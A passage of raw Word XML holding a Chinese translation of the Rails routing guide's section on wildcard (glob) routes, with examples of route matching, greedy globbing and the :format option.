            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; BlacklistConstraint.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21BF66B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3CEF564E"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3.11 通配路由匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44CEBF1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通配路由规则能够指定一个参数让任意部分匹配。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5136"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2143E470" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4A8667AB" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="603029279"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'photos/*other'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'photos#unknown'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="449F63F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这样这个路由将会匹配 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>photos/12</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/photos/long/path/to/12</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">,并且把 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:other]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置成 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"12"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"long/path/to/12"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CA0AC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通配字符串可以放在路由规则的任意部分,例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="153B51F4" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F0CB2FD" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="805045253"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match 'books/*section/:title'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'books#show'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1FC3C06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这样将会把像 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>books/some/section/last-words-a-memoir</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的字符串匹配后并将 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:section]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"some/section"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">， </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:title]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"last-words-a-memoir"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B9033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从技术上来说你是可以将超过一个统配的字符串加在你的路由规则中的，但是请记住，通配符总是会用贪婪地（尽可能多地匹配）将字符串匹配到路径上。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4176"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5BE90A8D" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5BBC251F" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1989282282"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match '*a/foo/*b'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'test#index'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1646997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将会把 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>zoo/woo/foo/bar/baz</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的参数 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:a]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置成 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"zoo/woo"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 然后参数 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:b]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置成 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"bar/baz"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. would match </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>zoo/woo/foo/bar/baz</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:a]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> equals </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"zoo/woo"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:b]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> equals </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"bar/baz"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D7A46B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从 Rails 3.1 开始，通配路由总是会自动地将格式字符串默认匹配，例如下面这个路由：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3816"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0623C32F" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46F6D3AF" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1455711135"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match '*pages'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'pages#show'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2503970D"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如果你发起了这样的一个请求，你的参数 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>params[:pages]</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会是 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>"foo/bar"</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，而你的请求格式会识别为 JSON 。 如果你想要在旧的 3.0.x 中有同样的特性，你需要提供一个散列参数</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:format =&gt; false</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,像这样</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5976"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7DC15764" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15C69150" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="824056659"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>match '*pages'</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'pages#show', :format</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7D42936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如果你想要强制地被指定一种格式，（其无法被忽略），你可以像这样加上 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:format =&gt; true</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5856"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5E542EBE" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7E1DF530" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
